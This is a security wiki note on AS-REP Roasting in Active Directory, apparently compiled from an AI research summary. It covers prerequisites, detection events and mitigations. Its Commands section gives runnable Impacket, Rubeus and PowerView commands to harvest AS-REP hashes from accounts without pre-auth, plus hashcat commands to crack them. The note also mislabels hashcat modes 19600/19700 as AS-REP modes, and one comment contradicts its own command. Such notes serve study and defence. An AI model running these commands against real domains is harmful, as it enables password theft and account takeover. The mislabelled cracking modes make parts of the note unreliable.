---
title: AS-REP Roasting
type: source
created: 2026-06-12
updated: 2026-06-12
tags: [kerberos, active-directory, credential-access]
source: raw/asrep_roasting.md
---

# AS-REP Roasting

> Source: `raw/asrep_roasting.md` (Gemini research summary)

## Summary

Targets accounts with `DONT_REQ_PREAUTH` set (Kerberos pre-auth disabled).
Anyone can send an AS-REQ for such an account and get back an AS-REP whose
relevant portion is encrypted with *that user's* password hash — crackable
offline, just like [[kerberoasting]] but one Kerberos step earlier and no
domain creds needed for the request itself (though enumeration usually
needs them).

## Key points

- **Prerequisite**: target account has pre-auth disabled; username known.
- **Tools**: Impacket `GetNPUsers.py`, Rubeus.
- **Detection**: Event ID 4768 with Pre-Authentication Type = 0; LDAP
  queries for `userAccountControl` bitmask `4194304`; RC4 downgrade; honey
  accounts with pre-auth disabled.
- **Mitigations**: keep pre-auth enabled (primary fix), [[gmsa]] / strong
  passwords for any exception accounts, disable RC4, Protected Users.

## Commands

```bash
# Enumerate accounts with pre-auth disabled (requires domain creds for LDAP bind)
GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -dc-ip <dc-ip> -format hashcat -outputfile asrep.txt

# Anonymous/no-creds enumeration (works if you have a valid username list and
# the domain allows unauthenticated LDAP/bind, or you already have one cred)
GetNPUsers.py DOMAIN/ -usersfile users.txt -no-pass -dc-ip <dc-ip>
```

```powershell
# Rubeus — roast all accounts with DONT_REQ_PREAUTH set
Rubeus.exe asreproast /outfile:asrep.txt /format:hashcat

# PowerView — find pre-auth-not-required accounts
Get-DomainUser -PreauthNotRequired -Properties samaccountname
```

```bash
# Crack with hashcat (mode 18200 = AS-REP etype 23 / RC4)
hashcat -m 18200 asrep.txt wordlist.txt

# AES-encrypted AS-REP (etype 17/18)
hashcat -m 19600 asrep.txt wordlist.txt   # AES128
hashcat -m 19700 asrep.txt wordlist.txt   # AES256
```

## Links

- [[kerberos-authentication]] — protocol context (AS-REQ/AS-REP stage)
- [[gmsa]], [[ad-tiering-and-hardening]] — mitigations
- [[kerberoasting]] — sibling offline-cracking technique, different ticket
  stage and different target secret (user hash vs. service account hash)
